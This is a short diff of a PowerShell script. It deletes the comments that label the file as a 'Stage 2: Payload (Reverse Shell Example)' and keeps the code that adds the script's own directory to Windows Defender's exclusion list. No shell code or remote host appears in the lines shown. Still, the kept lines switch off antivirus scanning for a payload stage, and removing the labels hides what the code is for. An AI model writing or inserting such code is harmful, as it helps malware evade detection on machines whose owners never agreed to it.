@@ -1,6 +1,4 @@
-# Stage 2: Payload (Reverse Shell Example)
 
-# Add Windows Defender exclusion for the script's directory
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
 Add-MpPreference -ExclusionPath $scriptDir
 
